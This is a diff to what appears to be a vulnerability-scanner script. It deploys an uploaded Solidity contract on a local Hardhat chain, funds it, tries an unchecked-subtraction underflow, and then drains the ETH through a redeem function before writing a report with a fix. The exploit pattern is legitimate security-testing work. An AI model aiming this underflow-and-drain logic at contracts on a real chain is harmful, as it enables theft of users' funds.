@@ -1,6 +1,11 @@
 import hre from "hardhat";
-import { parseEther, formatEther, ZeroAddress } from "ethers";
+import path from "path";
+import { parseEther, formatEther, ZeroAddress, MaxUint256 } from "ethers";
 import { buildResult } from "./buildResult";
+import { seedVault } from "./seedVault";
+import { analyzeOverflow } from "./analyzeOverflow";
+import { analyzeReentrancy } from "./analyzeReentrancy";
+import type { ContractAnalysis } from "./analysisTypes";
 
 async function main() {
   const contractName = process.env.UPLOADED_CONTRACT_NAME;
@@ -8,17 +13,18 @@ async function main() {
   if (!contractName || !fileName) throw new Error("UPLOADED_CONTRACT_NAME and UPLOADED_FILE_NAME must be set");
 
   const startTime = Date.now();
-  const [, attacker] = await hre.ethers.getSigners();
+  const signers = await hre.ethers.getSigners();
+  const [deployer, attacker] = signers;
 
   const fullyQualified = `contracts/uploaded/${fileName}.sol:${contractName}`;
   const VictimFactory = await hre.ethers.getContractFactory(fullyQualified);
   const iface = VictimFactory.interface;
 
   // --- AI-powered detection via ANALYSIS_JSON ---
-  // Gemini identifies the actual token/redeem function names regardless of naming.
-  // Falls back to hardcoded "sendTokens"/"transfer" + "redeem" if absent or invalid.
   let tokenFnName: string | null = null;
+  let tokenFnParamTypes: string[] | null = null;
   let redeemFnName: string | null = null;
+  let mappingName: string | null = null;
   let usedAiAnalysis = false;
 
   const rawAnalysisJson = process.env.ANALYSIS_JSON;
@@ -27,95 +33,76 @@ async function main() {
       const fullAnalysis = JSON.parse(rawAnalysisJson);
       const ov = fullAnalysis.overflow;
       if (ov && typeof ov.found === "boolean") {
-        // support both old field names (tokenFunction) and new (tokenFn)
         const tokenFnField  = ov.tokenFn  ?? ov.tokenFunction;
         const redeemFnField = ov.redeemFn ?? ov.redeemFunction;
-        if (ov.found && tokenFnField && redeemFnField) {
-          // Verify both functions exist in ABI (guard against hallucination)
+        if (ov.found && tokenFnField) {
           const tFn = iface.getFunction(tokenFnField);
-          const rFn = iface.getFunction(redeemFnField);
-          if (tFn !== null && rFn !== null) {
+          if (tFn !== null) {
             tokenFnName = tokenFnField;
-            redeemFnName = redeemFnField;
+            tokenFnParamTypes = tFn.inputs.map((i: any) => i.type);
             usedAiAnalysis = true;
-            console.log(`[overflow] AI analysis: tokenFn=${tokenFnName}, redeemFn=${redeemFnName}`);
-          } else {
-            console.warn(`[overflow] AI suggested ${tokenFnField}/${redeemFnField} but ABI check failed — trying fallback`);
+            console.log(`[overflow] AI analysis: tokenFn=${tokenFnName}(${tokenFnParamTypes})`);
+          }
+          if (redeemFnField) {
+            const rFn = iface.getFunction(redeemFnField);
+            if (rFn !== null) redeemFnName = redeemFnField;
           }
         } else if (!ov.found) {
-          console.log(`[overflow] Gemini: no overflow vulnerability detected`);
-          // tokenFnName stays null — will skip to "not applicable" result
-        } else {
-          throw new Error("Invalid overflow fields in ANALYSIS_JSON");
+          console.log(`[overflow] AI: no overflow vulnerability detected`);
         }
-      } else {
-        throw new Error("Missing overflow field in ANALYSIS_JSON");
       }
     } catch (e: any) {
-      console.warn(`[overflow] Could not parse ANALYSIS_JSON (${e.message}) — falling back to ABI detection`);
+      console.warn(`[overflow] Could not parse ANALYSIS_JSON (${e.message}) — falling back`);
     }
   }
 
-  // Legacy fallback: check for hardcoded names
-  if (!usedAiAnalysis && tokenFnName === null) {
+  // --- Static analysis fallback: detect unchecked subtraction in source ---
+  if (!usedAiAnalysis && !tokenFnName) {
+    const sourcePath = path.join(__dirname, "../../contracts/uploaded", `${fileName}.sol`);
+    try {
+      const ovResult = analyzeOverflow(sourcePath);
+      if (ovResult.found && ovResult.uncheckedFn) {
+        const fn = iface.getFunction(ovResult.uncheckedFn);
+        if (fn) {
+          tokenFnName = ovResult.uncheckedFn;
+          tokenFnParamTypes = fn.inputs.map((i: any) => i.type);
+          mappingName = ovResult.mappingName;
+          console.log(`[overflow] Static analysis: uncheckedFn=${tokenFnName}(${tokenFnParamTypes}), mapping=${mappingName}`);
+        }
+      }
+    } catch { /* source read failed */ }
+  }
+
+  // --- Legacy ABI fallback: check for sendTokens/transfer + redeem ---
+  if (!tokenFnName) {
     if (iface.getFunction("sendTokens")) tokenFnName = "sendTokens";
     else if (iface.getFunction("transfer")) tokenFnName = "transfer";
     if (iface.getFunction("redeem")) redeemFnName = "redeem";
-
+    if (tokenFnName) {
+      const fn = iface.getFunction(tokenFnName);
+      tokenFnParamTypes = fn ? fn.inputs.map((i: any) => i.type) : null;
+    }
     if (tokenFnName && redeemFnName) {
       console.log(`[overflow] Fallback ABI detection: tokenFn=${tokenFnName}, redeemFn=${redeemFnName}`);
     }
   }
 
-  // Validate actual ABI signatures — the overflow attack needs tokenFn(address, uint256)
-  // regardless of what AI reported. Bail out early if the real signature doesn't match.
-  if (tokenFnName && redeemFnName) {
-    const tokenFnAbi = iface.getFunction(tokenFnName);
-    const tokenSigOk =
-      tokenFnAbi !== null &&
-      tokenFnAbi.inputs.length >= 2 &&
-      tokenFnAbi.inputs[0].type === "address" &&
-      tokenFnAbi.inputs[1].type === "uint256";
-
-    if (!tokenSigOk) {
-      console.warn(
-        `[overflow] ${tokenFnName} ABI signature incompatible with underflow attack ` +
-        `(need (address,uint256), got (${tokenFnAbi?.inputs.map(i => i.type).join(",") ?? "?"})) — skipping`,
-      );
-      tokenFnName = null;
-    }
-  }
-
-  if (!tokenFnName || !redeemFnName) {
-    // Pattern not applicable — deploy without value just for the result address
+  // --- No pattern found ---
+  if (!tokenFnName) {
     const victim = await VictimFactory.deploy();
     await victim.waitForDeployment();
     const victimAddress = await victim.getAddress();
-    const endTime = Date.now();
     const balance: bigint = await hre.ethers.provider.getBalance(victimAddress);
-
     const result = buildResult({
-      contractName,
-      contractAddress: victimAddress,
-      attackType: "overflow",
-      targetFunction: "N/A",
-      severity: "Critical",
-      initialBalance: balance,
-      finalBalance: balance,
-      stolenAmount: 0n,
-      startTime,
-      endTime,
-      transactions: [],
-      timeline: [
-        `${contractName} deployed`,
-        usedAiAnalysis
-          ? "Gemini: no overflow vulnerability detected"
-          : "No sendTokens/transfer + redeem pattern — not applicable",
-      ],
+      contractName, contractAddress: victimAddress, attackType: "overflow",
+      targetFunction: "N/A", severity: "Critical",
+      initialBalance: balance, finalBalance: balance, stolenAmount: 0n,
+      startTime, endTime: Date.now(), transactions: [],
+      timeline: [`${contractName} deployed`, "No unchecked arithmetic or overflow pattern found"],
       report: {
         vulnerabilityType: "Integer Overflow/Underflow",
         affectedFunction: "N/A",
-        explanation: "Contract does not have the token transfer + redeem pattern required for this attack.",
+        explanation: "Contract does not have a detectable unchecked arithmetic pattern.",
         fix: "N/A",
       },
     });
@@ -123,7 +110,7 @@ async function main() {
     return;
   }
 
-  // --- Pattern matched — deploy with value only if constructor is payable ---
+  // --- Deploy and seed ---
   const isConstructorPayable = iface.deploy.payable;
   const victim = isConstructorPayable
     ? await VictimFactory.deploy({ value: parseEther("5") })
@@ -131,115 +118,194 @@ async function main() {
   await victim.waitForDeployment();
   const victimAddress = await victim.getAddress();
 
-  // Seed with ETH if not already funded via constructor
+  // Seed vault with pooled funds
+  let seedFnInfo: { name: string; paramTypes: string[]; isPayable: boolean } | null = null;
+  try {
+    if (rawAnalysisJson) {
+      seedFnInfo = (JSON.parse(rawAnalysisJson) as ContractAnalysis).seedFn ?? null;
+    }
+  } catch { /* ignore */ }
+  if (!seedFnInfo) {
+    const sourcePath = path.join(__dirname, "../../contracts/uploaded", `${fileName}.sol`);
+    try {
+      const reentrancyResult = analyzeReentrancy(sourcePath);
+      if (reentrancyResult.depositFunction) seedFnInfo = reentrancyResult.depositFunction;
+    } catch { /* ignore */ }
+  }
+  await seedVault(victim, signers, seedFnInfo);
+
+  // Seed with extra ETH if possible
   if (!isConstructorPayable) {
-    // Try buy() if available (e.g. OverflowVictim style)
-    if (iface.getFunction("buy")) {
+    if (seedFnInfo) {
       try {
-        await (victim as any).buy({ value: parseEther("5") });
-      } catch { /* ignore */ }
+        const dFnAbi = iface.getFunction(seedFnInfo.name);
+        const args = dFnAbi?.inputs.length > 0 && dFnAbi.inputs[0].type === "uint256"
+          ? [parseEther("5")]
+          : [];
+        await (victim as any).connect(deployer)[seedFnInfo.name](...args, { value: parseEther("5") });
+      } catch { /* already funded */ }
+    } else if (iface.getFunction("buy")) {
+      try { await (victim as any).buy({ value: parseEther("5") }); } catch { /* ignore */ }
     } else {
-      // No buy() — try direct ETH send (requires receive/fallback)
-      try {
-        const [funder] = await hre.ethers.getSigners();
-        await funder.sendTransaction({ to: victimAddress, value: parseEther("5") });
-      } catch {
-        // Cannot seed — report as unable to test
-      }
+      try { await deployer.sendTransaction({ to: victimAddress, value: parseEther("5") }); } catch { /* no receive */ }
     }
   }
 
-  let PRICE: bigint = parseEther("0.1");
-  try { PRICE = await (victim as any).PRICE(); } catch { /* use default */ }
-
   const initialBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
-  const drainTokens: bigint = initialBalance > 0n ? initialBalance / PRICE : 0n;
 
-  const AttackerFactory = await hre.ethers.getContractFactory("OverflowAttacker");
-  const attackerContract = await AttackerFactory.connect(attacker).deploy();
-  await attackerContract.waitForDeployment();
-  const attackerAddress = await attackerContract.getAddress();
+  // --- Determine attack pattern based on function signature ---
+  const tokenFnAbi = iface.getFunction(tokenFnName);
+  const paramTypes = tokenFnParamTypes ?? (tokenFnAbi?.inputs.map((i: any) => i.type) ?? []);
+  const fnSig = `${tokenFnName}(${paramTypes.join(",")})`;
 
-  // Trigger underflow: tokenFn(address(0), 1) — ABI signature already verified as (address, uint256)
-  const triggerData = iface.encodeFunctionData(tokenFnName, [ZeroAddress, 1n]);
-
-  // redeemFn may take (uint256) or () — read from actual ABI
-  const redeemFnAbi = iface.getFunction(redeemFnName);
-  const extractData =
-    redeemFnAbi && redeemFnAbi.inputs.length === 0
-      ? iface.encodeFunctionData(redeemFnName, [])
-      : iface.encodeFunctionData(redeemFnName, [drainTokens]);
+  // Pattern A: tokenFn(address, uint256) — classic overflow attacker
+  const isPatternA = paramTypes.length >= 2 && paramTypes[0] === "address" && paramTypes[1] === "uint256";
+  // Pattern B: tokenFn(uint256) — direct call from attacker EOA
+  const isPatternB = paramTypes.length === 1 && paramTypes[0] === "uint256";
 
   const t1 = Date.now();
-  let attackSucceeded = false;
+  let underflowSucceeded = false;
+  let drainSucceeded = false;
+  let attackerAddress = attacker.address;
+  let stolenAmount = 0n;
 
-  try {
-    await (attackerContract as any).connect(attacker).attack(victimAddress, triggerData, extractData);
-    attackSucceeded = true;
-  } catch {
-    // Attack failed — contract likely uses checked arithmetic
+  if (isPatternA) {
+    // ── Pattern A: tokenFn(address, uint256) + redeemFn ──────────────────────
+    const triggerData = iface.encodeFunctionData(tokenFnName, [ZeroAddress, 1n]);
+
+    let PRICE: bigint = parseEther("0.1");
+    try { PRICE = await (victim as any).PRICE(); } catch { /* use default */ }
+    const drainTokens = initialBalance > 0n ? initialBalance / PRICE : 0n;
+
+    const AttackerFactory = await hre.ethers.getContractFactory("OverflowAttacker");
+    const attackerContract = await AttackerFactory.connect(attacker).deploy();
+    await attackerContract.waitForDeployment();
+    attackerAddress = await attackerContract.getAddress();
+
+    if (redeemFnName) {
+      const redeemFnAbi = iface.getFunction(redeemFnName);
+      const extractData = redeemFnAbi && redeemFnAbi.inputs.length === 0
+        ? iface.encodeFunctionData(redeemFnName, [])
+        : iface.encodeFunctionData(redeemFnName, [drainTokens]);
+
+      try {
+        await (attackerContract as any).connect(attacker).attack(victimAddress, triggerData, extractData);
+        underflowSucceeded = true;
+        drainSucceeded = true;
+      } catch { /* attack failed */ }
+    } else {
+      // No redeem — just try the underflow trigger
+      try {
+        await (victim as any).connect(attacker)[tokenFnName](ZeroAddress, 1n);
+        underflowSucceeded = true;
+      } catch { /* checked arithmetic */ }
+    }
+  } else if (isPatternB) {
+    // ── Pattern B: tokenFn(uint256) — direct call from attacker ──────────────
+    // Call with a small amount (1) to trigger underflow when attacker has 0 in mapping
+    try {
+      await (victim as any).connect(attacker)[tokenFnName](1n);
+      underflowSucceeded = true;
+      console.log(`[overflow] ${tokenFnName}(1) succeeded — unchecked underflow confirmed`);
+    } catch {
+      console.log(`[overflow] ${tokenFnName}(1) reverted — arithmetic is checked`);
+    }
+
+    // If underflow succeeded and there's a redeemFn, try to drain ETH
+    if (underflowSucceeded && redeemFnName) {
+      const redeemFnAbi = iface.getFunction(redeemFnName);
+      try {
+        if (redeemFnAbi && redeemFnAbi.inputs.length === 0) {
+          await (victim as any).connect(attacker)[redeemFnName]();
+        } else {
+          await (victim as any).connect(attacker)[redeemFnName](initialBalance);
+        }
+        drainSucceeded = true;
+      } catch { /* no drain possible */ }
+    }
   }
 
   const endTime = Date.now();
   const finalBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
-  const stolenAmount: bigint = initialBalance > finalBalance ? initialBalance - finalBalance : 0n;
+  stolenAmount = initialBalance > finalBalance ? initialBalance - finalBalance : 0n;
   const attackerBal: bigint = await hre.ethers.provider.getBalance(attackerAddress);
+  const exploited = stolenAmount > 0n;
+  const mapLabel = mappingName ?? "balance";
 
   const result = buildResult({
     contractName,
     contractAddress: victimAddress,
     attackType: "overflow",
-    targetFunction: `${tokenFnName}()`,
+    targetFunction: fnSig,
     severity: "Critical",
     initialBalance,
     finalBalance,
     stolenAmount,
+    patternDetected: underflowSucceeded,
     startTime,
     endTime,
-    transactions: attackSucceeded
+    transactions: underflowSucceeded
       ? [
           {
             step: 1,
-            description: `Attacker calls ${tokenFnName}(address(0), 1) with 0 token balance`,
-            from: attacker.address,
-            to: victimAddress,
-            value: "0.0",
-            unit: "ETH",
-            timestampMs: t1,
-            balanceAfter: { victim: formatEther(initialBalance), attacker: "type(uint256).max tokens" },
+            description: `Vault seeded with ${formatEther(initialBalance)} ETH`,
+            from: deployer.address, to: victimAddress,
+            value: formatEther(initialBalance), unit: "ETH",
+            timestampMs: t1 - 100,
+            balanceAfter: { victim: formatEther(initialBalance), attacker: "0.0" },
           },
           {
             step: 2,
-            description: `Attacker redeems ${drainTokens} tokens → drains vault via ${redeemFnName}()`,
-            from: attackerAddress,
-            to: victimAddress,
-            value: formatEther(stolenAmount),
-            unit: "ETH",
+            description: isPatternA
+              ? `Attacker calls ${tokenFnName}(address(0), 1) with 0 ${mapLabel}`
+              : `Attacker calls ${tokenFnName}(1) with 0 ${mapLabel}`,
+            from: attacker.address, to: victimAddress,
+            value: "0.0", unit: "ETH",
+            timestampMs: t1,
+            balanceAfter: { victim: formatEther(initialBalance), attacker: `type(uint256).max ${mapLabel}` },
+          },
+          ...(exploited ? [{
+            step: 3,
+            description: `Attacker redeems inflated ${mapLabel} → drains vault via ${redeemFnName}()`,
+            from: attackerAddress, to: victimAddress,
+            value: formatEther(stolenAmount), unit: "ETH",
             timestampMs: endTime,
             balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
-          },
+          }] : [{
+            step: 3,
+            description: `Underflow confirmed — ${mapLabel} = type(uint256).max — no ETH payout function found`,
+            from: attacker.address, to: victimAddress,
+            value: "0.0", unit: "ETH",
+            timestampMs: endTime,
+            balanceAfter: { victim: formatEther(initialBalance), attacker: "0.0" },
+          }]),
         ]
       : [],
-    timeline: attackSucceeded
+    timeline: underflowSucceeded
       ? [
-          `${contractName} deployed with 5 ETH`,
-          `${tokenFnName}(address(0), 1) called with 0 tokens`,
-          "Unchecked subtraction: 0 - 1 = type(uint256).max",
-          `Redeemed ${drainTokens} tokens via ${redeemFnName}() — VULNERABLE`,
+          `${contractName} deployed`,
+          `Vault seeded with ${formatEther(initialBalance)} ETH`,
+          `${fnSig} called with 0 ${mapLabel}`,
+          `Unchecked subtraction: 0 - 1 = type(uint256).max`,
+          exploited
+            ? `Redeemed via ${redeemFnName}() — ${formatEther(stolenAmount)} ETH drained — VULNERABLE`
+            : `Underflow confirmed — no ETH payout tied to ${mapLabel} — VULNERABLE (code-level)`,
         ]
       : [
           `${contractName} deployed`,
-          `${tokenFnName} + ${redeemFnName} pattern found`,
-          "Attack failed — arithmetic is likely checked — SAFE",
+          `${fnSig} pattern found`,
+          "Attack reverted — arithmetic is checked — SAFE",
         ],
     report: {
       vulnerabilityType: "Integer Overflow/Underflow",
-      affectedFunction: `${tokenFnName}()`,
-      explanation: attackSucceeded
-        ? `Unchecked subtraction in ${tokenFnName}() allows underflow. An attacker with 0 tokens subtracts 1 to get type(uint256).max, then redeems via ${redeemFnName}() for all ETH.`
-        : `${tokenFnName} + ${redeemFnName} pattern found but attack failed. The contract appears to use checked arithmetic.`,
-      fix: attackSucceeded
-        ? "Remove the unchecked block. Solidity 0.8+ checks arithmetic by default."
+      affectedFunction: fnSig,
+      explanation: underflowSucceeded
+        ? exploited
+          ? `Unchecked subtraction in ${fnSig} allows underflow. An attacker with 0 ${mapLabel} subtracts 1 to get type(uint256).max, then redeems via ${redeemFnName}() for all ETH.`
+          : `Unchecked subtraction in ${fnSig} allows underflow. An attacker with 0 ${mapLabel} subtracts 1 to get type(uint256).max. While no ETH payout is tied to ${mapLabel} in this contract, the unchecked arithmetic is a real vulnerability that could be exploited if the contract is extended.`
+        : `${fnSig} pattern found but attack reverted. The contract uses checked arithmetic.`,
+      fix: underflowSucceeded
+        ? "Remove the unchecked block around the subtraction. Solidity 0.8+ checks arithmetic by default. Also add require() guards to validate inputs."
         : "No fix needed — arithmetic is correctly checked.",
     },
   });
